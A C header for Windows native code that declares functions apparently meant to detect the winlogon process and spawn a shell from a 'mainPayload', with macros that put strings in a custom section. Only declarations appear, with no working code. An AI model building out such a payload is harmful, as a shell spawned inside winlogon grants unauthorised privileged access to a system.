#pragma once
#define WIN32_NO_STATUS
#include "ntdll.h"
#undef WIN32_NO_STATUS	
#include <ntstatus.h>

#define SECTION_NAME ".ochinpo"
#pragma section(SECTION_NAME, read, write)
#define	WCHR __declspec(allocate(SECTION_NAME), align(1)) WCHAR
#define	CHR	__declspec(allocate(SECTION_NAME), align(1)) CHAR
//#define	WCHAR_DECL(x, str) extern WCHR x[(sizeof(str) / sizeof(WCHAR))];
#define	WCHAR_DEF(x, str) WCHR x[(sizeof(str) / sizeof(WCHAR))] = str;
#define	CHAR_DEF(x, str)  CHR x[sizeof(str)] = str;

bool checkForWinlogonProcessName(void);
void spawnShell();
void mainPayload();
void ExecuteShell();
BOOLEAN
RtlUnicodeStringEndsIn(
    _In_ PCUNICODE_STRING String,
    _In_ PCUNICODE_STRING Substring,
    _In_ BOOLEAN CaseInsensitive
);